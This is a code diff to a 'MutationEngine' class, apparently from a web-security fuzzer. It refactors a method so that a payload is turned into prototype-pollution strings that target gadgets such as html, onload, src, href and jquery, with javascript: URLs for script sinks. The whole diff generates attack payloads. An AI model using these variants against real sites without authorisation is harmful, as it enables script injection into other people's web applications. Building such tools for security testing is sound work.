@@ -629,27 +629,27 @@ class MutationEngine:
     def apply_prototype_pollution(payload: str) -> List[str]:
         """Wrap payload into prototype pollution formats targeting common gadgets (e.g. html, onload, src)."""
         action = payload
-        if "javascript:" in action.lower():
-            action = action.replace("javascript:", "")
+        js_payload = action
+        if "javascript:" in js_payload.lower():
+            js_payload = js_payload.replace("javascript:", "")
             
         variants = []
-        # Target common sink and execution gadgets
-        variants.append(f"__proto__[html]={action}")
-        variants.append(f"__proto__.html={action}")
-        variants.append(f"constructor[prototype][html]={action}")
+        gadgets = ["html", "onload", "src", "url", "href", "sourceURL", "content", "jquery"]
         
-        variants.append(f"__proto__[onload]=javascript:{action}")
-        variants.append(f"__proto__.onload=javascript:{action}")
-        variants.append(f"constructor[prototype][onload]=javascript:{action}")
-        
-        variants.append(f"__proto__[src]=javascript:{action}")
-        variants.append(f"__proto__.src=javascript:{action}")
-        variants.append(f"constructor[prototype][src]=javascript:{action}")
-        
-        variants.append(f"__proto__[url]=javascript:{action}")
-        variants.append(f"__proto__.url=javascript:{action}")
-        variants.append(f"constructor[prototype][url]=javascript:{action}")
-        
+        for g in gadgets:
+            # HTML context gadgets (retains action as-is)
+            if g in ["html", "content"]:
+                variants.append(f"__proto__.{g}={action}")
+                variants.append(f"__proto__[{g}]={action}")
+                variants.append(f"constructor.prototype.{g}={action}")
+                variants.append(f"constructor[prototype][{g}]={action}")
+            # Script/URL context gadgets (uses javascript: action)
+            else:
+                variants.append(f"__proto__.{g}=javascript:{js_payload}")
+                variants.append(f"__proto__[{g}]=javascript:{js_payload}")
+                variants.append(f"constructor.prototype.{g}=javascript:{js_payload}")
+                variants.append(f"constructor[prototype][{g}]=javascript:{js_payload}")
+                
         return variants
 
     @staticmethod
